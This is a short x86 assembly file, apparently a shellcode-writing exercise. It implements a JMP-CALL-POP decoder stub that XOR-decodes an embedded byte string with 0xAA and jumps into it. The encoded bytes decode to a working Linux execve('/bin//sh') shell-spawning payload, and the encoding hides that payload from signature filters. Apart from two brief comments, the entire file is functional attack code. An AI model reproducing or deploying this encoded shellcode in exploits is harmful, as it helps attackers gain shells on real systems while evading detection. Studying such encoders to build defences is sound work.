
global _start

section .text

_start: 
	; Now here we write the decoder stub 
	
	jmp short call_decoder


decoder: 

	pop esi 
	
		
decode: 	

	xor byte [esi], 0xAA
	jz Shellcode
	inc esi 
	jmp short decode 


call_decoder: 

	call decoder

	; the first thing the decoder would require is to figure out where exactly your shellcode sitting in
	; the program memory for this we will use JMP-CALL-POP technique to find this out 

	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa
